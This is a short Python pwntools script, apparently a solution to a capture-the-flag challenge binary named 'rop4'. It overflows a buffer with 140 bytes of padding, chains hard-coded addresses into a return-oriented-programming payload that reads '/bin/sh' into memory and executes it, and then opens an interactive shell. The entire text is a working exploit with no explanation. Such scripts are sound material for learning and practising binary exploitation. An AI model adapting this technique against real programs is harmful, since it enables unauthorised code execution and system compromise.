from pwn import *
context.log_level = 'debug'
p = process('./rop4')
file = ELF('rop4')
junk = 'a'*140

readin = junk+p32(0x08053D20)+p32(0x0808a950) + \
    p32(0)+p32(0x080F112C)+p32(7)+p32(0x08048ED0)

p.send(readin)
p.send('/bin/sh\x00')
p.interactive()
